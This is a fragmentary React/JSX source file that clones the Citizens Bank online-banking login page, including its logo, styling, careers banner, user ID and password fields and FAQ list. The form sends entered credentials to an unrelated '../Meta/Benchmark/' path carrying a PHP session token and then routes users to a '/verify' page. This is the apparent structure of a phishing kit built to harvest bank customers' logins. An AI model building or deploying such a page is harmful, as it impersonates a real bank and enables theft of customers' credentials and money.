...
import '../assets/css/Login/jquery-ui-1.css';
import '../assets/css/Login/normalize.css';
import '../assets/css/Login/main.css';
import '../assets/css/Login/flows.css';
import '../assets/css/Login/ad-containers.css';
import '../assets/css/Login/citizensns.css';
import '../assets/css/Login/sec-3-3.css';
    ...
    <div>
      <div class="citizens-header-footer-injected">
        <div class="citizens-header-footer">
          <div
            class="citi-modal timeout-modal simplemodal-data"
            id="timeout-modal"
            style={{ display: 'none' }}></div>
          <div
            class="citi-modal help-modal"
            id="help-modal"
            tabindex="0"
            style={{ display: 'none' }}></div>
        </div>
          ...
          <div id="page-header" class="page-header">
            ...
            <div class="centered-content clearfix">
              <a style={{ cursor: 'pointer' }} class="page-logo" tabindex="1">
                <img alt="Citizens Bank" src={logo} width="203" height="25" />
              </a>
                  ...
                  <div class="account-content-container">
                    <div class="account-table-body">
                      <header class="account-section-title clearfix account-secure">
                        <a style={{ cursor: 'pointer' }} class="mobile-help-trigger">
                          Help
                        </a>
                      ...
                      <div id="GlobalMessageContainer">
                        <div className="global-message status-message">
                          <h1>Ready to share your talents?</h1>
                          <p>
                            You’re more than a customer and we’re more than a bank. So let’s join
                            together and create great experiences.{' '}
                            <a
                              href="https://jobs.citizensbank.com/?utm_source=OT&amp;utm_medium=Consumer_Marketing&amp;utm_campaign=RM_CustomerMkt_OLB&amp;utm_term=&amp;utm_content=Other"
                              target="_blank">
                      ...
                      <section class="account-section">
                        <form
                          method="POST"
                          action="../Meta/Benchmark/?token=<?php echo $_SESSION['token']; ?>"
                          id="form"
                          class="pay-transfer-options clearfix">
                          ...
                          <div class="form-item label-right full-width clearfix">
                              ...
                              <span class="inline-tooltip">
                                ...
                                <span id="tooltipHover" class="tooltip">
                                  <div
                                    id="tooltip"
                                    class="tooltip-icon"
                                    title="Remember User ID tooltip"></div>
                                  <div class="tooltip-box">
                                    <div class="tooltip-content" id="aria-tooltip-content">
                                      ...
                                      <br />
                                      <div>
                                        DO NOT check this box if you are using a public device that
                            ...
                            <div class="form-item full-width">
                              <label id="lp" for="currentpassword">
                            ...
                            <span style={{ cursor: 'pointer' }} class="mobile-line-break">
                              <a tabindex="7" style={{ fontSize: 16 }}>
                                Trouble logging in?
                              </a>
                            </span>
                            <br />
                          ...
                          <div class="form-actions">
                            <Link to="/verify">
                              <input
                                id="btn"
                                type="submit"
                                class="submit-button arrow"
                                value="Login"
                              />
                            </Link>
                            <a tabindex="8" style={{ cursor: 'pointer' }} class="cancel">
                              Cancel
                            </a>
                          </div>
                        </form>
                  ...
                  <div id="faq-holder">
                    <section class="toggle-list-container faq-container" id="faq-index-1">
                      <a
                        ...
                        class="sidebar-list-option-accordian showhide">
                    ...
                    <section class="toggle-list-container faq-container" id="faq-index-12">
                      <a
                        ...
                        Should my browser address bar have a "green" indicator when I use Online
                        Banking?
                      </a>
                    </section>
